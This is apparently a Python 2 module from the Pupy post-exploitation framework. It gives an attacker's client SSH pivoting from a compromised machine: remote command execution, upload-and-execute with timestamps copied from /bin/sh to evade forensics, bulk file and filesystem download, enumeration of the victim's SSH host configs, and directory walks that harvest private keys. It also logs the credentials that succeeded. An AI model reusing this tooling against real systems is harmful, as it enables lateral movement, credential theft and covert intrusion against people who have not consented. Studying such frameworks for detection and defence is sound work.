# -*- coding: utf-8 -*-

from pupylib.PupyModule import config, PupyModule, PupyArgumentParser, REQUIRE_STREAM
from pupylib.PupyCompleter import path_completer
from pupylib.PupyOutput import Table, Color

from os import path, makedirs, unlink, walk, stat
from stat import S_ISDIR
from errno import EEXIST

from threading import Event
from argparse import REMAINDER

__class_name__="SSH"

@config(cat='admin')
class SSH(PupyModule):
    """ ssh client """

    dependencies = [
        'nacl', 'bcrypt', 'ecdsa',
        'cryptography', 'paramiko', 'ssh',
        'puttykeys'
    ]

    closer = None
    waiter = None
    pkeys = None

    current_connection_info = {}

    io = REQUIRE_STREAM

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog='ssh', description=cls.__doc__)
        cls.arg_parser.add_argument('-T', '--timeout',
                                    type=int, default=30, help='Set communication timeout (default=30s)')
        cls.arg_parser.add_argument('-u', '--user', help='Use user name')
        cls.arg_parser.add_argument('-p', '--port', type=int, help='Use port')
        cls.arg_parser.add_argument('-P', '--password', default=[], action='append',
                                    help='SSH auth password (may be specified many times)')
        cls.arg_parser.add_argument('-KP', '--key-password', default=[], action='append',
                                    help='SSH key password (may be specified many times)')
        cls.arg_parser.add_argument('-k', '--private-keys', help='Use private keys (Use "," as path separator)',
                                    completer=path_completer)

        commands = cls.arg_parser.add_subparsers(dest='command')
        rexec = commands.add_parser('exec')
        rexec.add_argument('host', help='host(s) to connect')
        rexec.add_argument(
            'command', nargs=REMAINDER, help='Command line to execute (non interactive)')
        rexec.set_defaults(func=cls.rexec)

        upload = commands.add_parser('upload')
        upload.add_argument('-t', '--relative-timestamp', default='/bin/sh',
                            help='Set creation time same as specified binary')
        upload.add_argument('-m', '--chmod', help='Set file mode')
        upload.add_argument('-o', '--chown', help='Set file owner')
        upload.add_argument('-E', '--execute', action='store_true', help='Execute file after upload')
        upload.add_argument('-U', '--unlink', action='store_true', help='Unlink file before & after upload')
        upload.add_argument('host', help='Remote host(s)')
        upload.add_argument('src_path', help='Upload file or directory')
        upload.add_argument('dst_path', help='Remote destination')
        upload.set_defaults(func=cls.upload)

        download = commands.add_parser('download')
        download.add_argument('-t', '--tar', action='store_true',
                              help='Use tar instead of cat (to download dirs)')
        download.add_argument('host', help='Remote host(s)')
        download.add_argument('src_path', help='Remote destination')
        download.add_argument('dst_path', nargs='?', help='Local destination (folder)')
        download.set_defaults(func=cls.download)

        hosts = commands.add_parser('hosts')
        hosts.add_argument('host', nargs='?', help='Show info for host')
        hosts.set_defaults(func=cls.hosts)

    def run(self, args):
        if args.func == SSH.hosts:
            self.hosts(args)
            return

        if args.private_keys:
            self.pkeys = list(self._find_private_keys(args.private_keys))

        args.host = tuple([
            x.strip() for x in args.host.split(',')
        ])

        self.waiter = Event()

        try:
            if args.func(self, args):
                self.waiter.wait()

        finally:
            self.closer = None

    def hosts(self, args):
        get_hosts = self.client.remote('ssh', 'ssh_hosts')
        records = get_hosts()

        if args.host:
            for user, hosts in records.iteritems():
                for alias, host in hosts.iteritems():
                    if args.host == alias or args.host == host.get('hostname'):
                        self.log(Table([{
                            'KEY':k, 'VALUE': ','.join(v) if type(v) == list else v
                        } for k,v in host.iteritems()],
                        ['KEY', 'VALUE'], Color('{}, user={}'.format(alias, user), 'yellow')))

        else:
            for user, hosts in records.iteritems():
                self.log(Table([{
                    'ALIAS':alias,
                    'USER':hosts[alias].get('user', user),
                    'HOST':hosts[alias]['hostname'],
                    'PORT':hosts[alias].get('port', 22),
                    'KEY':','.join(hosts[alias].get('identityfile', []))
                } for alias in hosts if 'hostname' in hosts[alias] and not alias == '*'],
                ['ALIAS', 'USER', 'HOST', 'PORT', 'KEY'], Color('User: {}'.format(user), 'yellow')))

    def _handle_on_data(self, args, data_cb, connect_cb=None, complete_cb=None):
        msg_type = args[0]
        if msg_type == 0:
            connected, host, port, user = args[1:]
            if connected:
                self.error('No credentials to auth to: {}{}:{}'.format(
                    user + '@' or '', host, port))
            else:
                self.error('Could not connect to {}:{}'.format(host, port))
        elif msg_type == 4:
            host, port, user, password, key_password, key, key_path, agent_socket, auto, cached = args[1:]
            key_info = ''

            if password:
                key_info = ' auth:password={}'.format(password)
            elif key_path:
                key_info = ' auth:key={}'.format(key_path)
            elif key:
                key_info = ' auth:key'
            elif agent_socket:
                key_info = ' auth:agent={}'.format(agent_socket)
            elif auto:
                key_info = ' auth:auto'

            if key_password:
                key_info += ' key_password={}'.format(key_password)

            if cached:
                key_info += ' [cached]'

            self.success('Connected to {}{}:{}{}'.format(
                user + '@' if user else '', host, port, key_info))

            self.current_connection_info.update({
                'host': host,
                'port': port,
                'user': user,
                'password': password,
                'key': key,
                'key_path': key_path,
                'auto': auto,
                'cached': cached,
             })
            if connect_cb:
                connect_cb()

        elif msg_type == 1:
            data_cb(args[1])
        elif msg_type == 3:
            self.error(args[1])
        elif msg_type == 2:
            self.current_connection_info.clear()
            if args[1] == 0:
                self.success('Completed')
                if complete_cb:
                    complete_cb(True)
            else:
                self.error('Completed with error={}'.format(args[1]))
                if complete_cb:
                    complete_cb(False)

    def rexec(self, args):
        rexec = self.client.remote('ssh', 'ssh_exec', False)

        command = ' '.join(args.command)
        if not command:
            self.error('Command should not be empty')
            return

        def on_data(args):
            self._handle_on_data(args, self.stdout.write)

        self.closer = rexec(
            command,
            args.host, args.port, args.user, (
                tuple(args.password), tuple(args.key_password)),
            self.pkeys, on_data, self.waiter.set, args.timeout
        )

        return True

    def download(self, args):
        download_file = self.client.remote('ssh', 'ssh_download_file', False)
        download_tar = self.client.remote('ssh', 'ssh_download_tar', False)

        download = download_tar if args.tar else download_file

        filesdir = args.dst_path or self.client.pupsrv.config.get_folder(
            'downloads', {'%c': self.client.short_name()})

        current_file_obj = [None]

        def create_file_obj():
            folder_path = path.join(filesdir, 'ssh', '{user}-{host}-{port}'.format(
                **self.current_connection_info))

            try:
                makedirs(folder_path)
            except OSError, e:
                if e.errno != EEXIST:
                    raise

            file_name = args.src_path.strip('/').replace('/', '_')
            if args.tar:
                file_name += '.tgz'

            if file_name == '.tgz':
                file_name = 'rootfs.tgz'

            file_path = path.join(folder_path, file_name)
            if path.isfile(file_path):
                unlink(file_path)

            current_file_obj[0] = open(file_path, 'w')

        def close_file_obj(ok):
            current_file_obj[0].close()
            if ok:
                self.success('Downloaded {} -> {}'.format(args.src_path, current_file_obj[0].name))
            else:
                unlink(current_file_obj[0].name)
                self.error('Downloaded {} -> {} <failed>'.format(args.src_path, current_file_obj[0].name))

        def write_file_obj(data):
            current_file_obj[0].write(data)

        def on_data(args):
            self._handle_on_data(args, write_file_obj, create_file_obj, close_file_obj)

        self.closer = download(
            args.src_path,
            args.host, args.port, args.user, (
                tuple(args.password), tuple(args.key_password)), self.pkeys,
            on_data, self.waiter.set, args.timeout
        )

        return True

    def upload(self, args):
        upload_file = self.client.remote('ssh', 'ssh_upload_file', False)

        input_stat = stat(args.src_path)

        if S_ISDIR(input_stat.st_mode):
            self.error('Directory upload is not supported. Use tar (manually)')
            return

        input_obj = open(args.src_path, 'rb')

        def on_complete(success):
            input_obj.close()

        def on_data(args):
            self._handle_on_data(args, self.stdout.write, complete_cb=on_complete)

        self.closer = upload_file(
            input_obj.read, args.dst_path,
            args.chmod or (input_stat.st_mode & 0777),
            args.relative_timestamp, args.chown, args.execute, args.unlink,
            args.host, args.port, args.user, (
                tuple(args.password), tuple(args.key_password)), self.pkeys,
            on_data, self.waiter.set, args.timeout
        )

        return True

    def interrupt(self):
        if self.closer is not None:
            self.closer()
            self.closer = None

        if self.waiter:
            self.waiter.set()

    def _find_private_keys(self, fpath):
        if path.isfile(fpath):
            try:
                with open(fpath) as content:
                    yield content.read()

            except OSError:
                pass

            return

        for root, dirs, files in walk(fpath):
            for sfile in files:
                try:
                    sfile_path = path.join(root, sfile)
                    with open(sfile_path) as content:
                        first_line = content.readline(256)
                        if 'PRIVATE KEY-----' in first_line:
                            yield first_line + content.read()

                except (OSError, IOError):
                    pass
